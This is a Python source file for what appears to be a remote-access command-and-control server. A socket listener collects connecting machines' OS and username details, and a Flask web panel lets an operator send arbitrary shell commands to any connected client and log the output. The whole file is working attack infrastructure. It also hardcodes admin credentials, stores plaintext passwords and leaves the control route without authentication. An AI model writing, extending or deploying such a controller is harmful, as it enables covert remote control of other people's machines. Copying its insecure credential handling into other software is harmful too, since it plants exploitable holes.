import socket
import threading
import sqlite3
import json
import time
from flask import Flask, request, render_template, redirect, url_for, session, jsonify

# Initialize Flask app
app = Flask(__name__)
app.secret_key = 'your_secret_key'
result = ''
# Database setup
conn = sqlite3.connect('database.db', check_same_thread=False)
c = conn.cursor()

# Create tables if not exist
c.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT UNIQUE, password TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS clients (id INTEGER PRIMARY KEY, ip_address TEXT, os TEXT, os_version TEXT, architecture TEXT, username TEXT, last_seen TEXT)''')
c.execute('''CREATE TABLE IF NOT EXISTS history (id INTEGER PRIMARY KEY, command TEXT, output TEXT, client_ip TEXT, timestamp TEXT)''')
conn.commit()
default_username = 'admin'
default_password = 'admin123'  # You can change this to any default password
c.execute('SELECT * FROM users WHERE username = ?', (default_username,))
if not c.fetchone():
    c.execute('INSERT INTO users (username, password) VALUES (?, ?)', (default_username, default_password))
    conn.commit()
# Globals
clients = {}
lock = threading.Lock()

# Functions for server-client communication
def client_handler(client_socket, client_address):
    ip = client_address[0]
    with lock:
        if ip in clients:
            clients[ip]['socket'] = client_socket
        else:
            clients[ip] = {'socket': client_socket, 'info': None}

    while True:
        try:
            data = client_socket.recv(1024).decode()
            if data:
                # Assuming the client sends info first
                if 'info:' in data:
                    client_info = json.loads(data.split('info:')[1])
                    with lock:
                        clients[ip]['info'] = client_info
                    update_client_in_db(ip, client_info)
                elif 'output:' in data:
                    # Handle command output
                    output_data = json.loads(data.split('output:')[1])
                    
                    save_command_history(output_data)
                else:
                    print(f"Received unknown data from {ip}: {data}")
            else:
                break
        except:
            break
    with lock:
        clients.pop(ip, None)
    client_socket.close()

def update_client_in_db(ip, info):
    c.execute('''INSERT OR REPLACE INTO clients (ip_address, os, os_version, architecture, username, last_seen) VALUES (?, ?, ?, ?, ?, ?)''',
              (ip, info['os'], info['os_version'], info['architecture'], info['username'], time.strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()

def save_command_history(output_data):
    c.execute('''INSERT INTO history (command, output, client_ip, timestamp) VALUES (?, ?, ?, ?)''',
              (output_data['command'], output_data['output'], output_data['ip'], time.strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()

# Flask routes
@app.route('/')
def index():
    if 'loggedin' in session:
        c.execute('SELECT * FROM clients')
        clients = c.fetchall()
        
        return render_template('index.html', clients=clients) 
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        c.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, password))
        user = c.fetchone()
        if user:
            session['loggedin'] = True
            session['id'] = user[0]
            session['username'] = user[1]
            return redirect(url_for('index'))
        else:
            return 'Incorrect username/password!'
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('loggedin', None)
    session.pop('id', None)
    session.pop('username', None)
    return redirect(url_for('login'))

@app.route('/send_command', methods=['GET','POST'])
def send_command():
    if 'loggedin' in session:
        command = request.form['command']
        client_ip = request.form['client_ip']
        with lock:
            client_socket = clients.get(client_ip, {}).get('socket')
            if client_socket:
                client_socket.send(f'cmd:{command}'.encode())
                return jsonify(success=True)
        return jsonify(error='Client not connected.')
    return redirect(url_for('login'))

@app.route('/history')
def history():
    if 'loggedin' in session:
        c.execute('SELECT * FROM history')
        history = c.fetchall()
        return render_template('history.html', history=history)
    return redirect(url_for('login'))

@app.route('/settings', methods=['GET', 'POST'])
def settings():
    if 'loggedin' in session:
        if request.method == 'POST':
            if 'theme' in request.form:
                 
                theme = request.form['theme']
                print(f"Theme changed to: {theme}")
            if 'new_username' in request.form and 'new_password' in request.form:
                new_username = request.form['new_username']
                new_password = request.form['new_password']
                if new_username and new_password:
                    try:
                        c.execute('INSERT INTO users (username, password) VALUES (?, ?)', (new_username, new_password))
                        conn.commit()
                    except sqlite3.IntegrityError:
                        return 'Username already exists!'
        c.execute('SELECT * FROM users')
        users = c.fetchall()
        return render_template('settings.html', users=users)
    return redirect(url_for('login'))

@app.route('/delete_user', methods=['POST'])
def delete_user():
    if 'loggedin' in session:
        user_id = request.form['user_id']
        c.execute('DELETE FROM users WHERE id = ?', (user_id,))
        conn.commit()
        return redirect(url_for('settings'))
    return redirect(url_for('login'))

@app.route('/control/<client_id>', methods=['GET', 'POST'])
def control(client_id):
    
    client_info = clients.get(client_id)
    print(client_info)
    try:
        
        ci = client_info["info"]
    except: 
        pass

    try:
        os = ci["os"]
    except: 
        pass
    try:
        tip = client_id
    except:
        pass
 


    if not client_info:
        return "Client not found", 404

    response = ''
    if request.method == 'POST':
        command = request.form.get('command')
        if command:
            try:
                client_socket = client_info['socket']
                client_socket.send(command.encode('utf-8'))  # Send command to client
                response = client_info['last_response']  # Get the last response after sending command
                print(result)
            except Exception as e:
                print(f"Error sending command: {e}")
                return render_template('control.html', client_info=client_info, error=str(e), response=response)
    
    return render_template('control.html', client_info=client_info, response=response, os = os, tip = tip )



# Start Flask app
def start_flask():
    app.run(debug=False, port=5000)

# Start Socket server
def start_socket_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))
    server.listen(5)
    print('Server listening on port 9999')

    while True:
        client_socket, client_address = server.accept()
        client_thread = threading.Thread(target=client_handler, args=(client_socket, client_address))
        client_thread.start()

if __name__ == "__main__":
    flask_thread = threading.Thread(target=start_flask)
    flask_thread.start()

    socket_thread = threading.Thread(target=start_socket_server)
    socket_thread.start()
